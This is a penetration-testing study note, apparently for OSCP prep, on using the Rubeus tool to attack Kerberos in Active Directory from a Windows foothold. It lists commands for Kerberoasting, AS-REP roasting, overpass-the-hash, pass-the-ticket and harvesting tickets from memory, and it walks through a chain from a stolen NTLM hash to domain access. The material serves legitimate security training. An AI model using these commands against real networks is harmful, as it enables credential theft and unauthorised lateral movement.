---
status: working
tags:
  - tooling
  - kerberos
  - active-directory
---
> Rubeus: The on-host Kerberos multitool for when you already have a shell on a domain-joined Windows box. Does everything ticket-related in memory, Kerberoast, AS-REP roast, request a TGT from a hash (overpass-the-hash), pass-the-ticket, and harvest tickets other users left in memory. This note is how to drive the tool, the attacks it performs are in [[AD Attacks]].

## When Rubeus vs Impacket

Reach for Rubeus when you are standing on a Windows foothold and want to stay on-host. Reach for impacket's `GetUserSPNs`/`GetNPUsers` ([[AD Attacks]]) when operating remotely from Kali with creds. Same attacks, different vantage point.

## Getting a Binary

It is C#, so it needs building, but precompiled is simplest and exam-legal: grab `Rubeus.exe` from the SharpCollection repo, or build once in Visual Studio (open `Rubeus.sln` → Release / x64 → Build). CLI build: `msbuild Rubeus.sln /p:Configuration=Release`.

> [!note]
> Match the target's .NET, older Windows may only have 3.5/4.0, so retarget the project framework if it will not launch. Transfer with evil-winrm `upload` or any [[File Transfer]] method. To run it in memory from evil-winrm, launch with `-e <dir>` and use `Invoke-Binary Rubeus.exe <args>`.

## Commands

```cmd
Rubeus.exe kerberoast /outfile:kerb.hash                        :: roast every SPN account
Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash        :: roast no-preauth accounts
Rubeus.exe asktgt /user:svc_sql /rc4:<NTLM> /ptt                 :: overpass-the-hash, inject TGT
Rubeus.exe ptt /ticket:<base64-or-path.kirbi>                    :: pass-the-ticket
Rubeus.exe triage                                                :: harvest tickets in memory (find a DA's TGT)
```

> [!note] OSCP-level chain
> You land as a service account and pull its NTLM from the SAM ([[Windows Privilege Escalation]]). Instead of dragging the hash to Kali, run `Rubeus.exe asktgt /user:svc_sql /rc4:<NTLM> /ptt`, now this shell holds svc_sql's TGT, so `dir \\dc01\c$` or a follow-up `Rubeus.exe kerberoast` runs as that account with no plaintext. Crack any roast output on Kali with `hashcat -m 13100` ([[Hash Cracking]]).

## See Also

- [[AD Attacks]] for what these attacks do and the impacket equivalents
- [[BloodyAD]] for the remote ACL-abuse counterpart
- [[AD Lateral Movement and Persistence]] for pass-the-ticket movement
- Source: [[OSCP Field Manual]] section 7.6
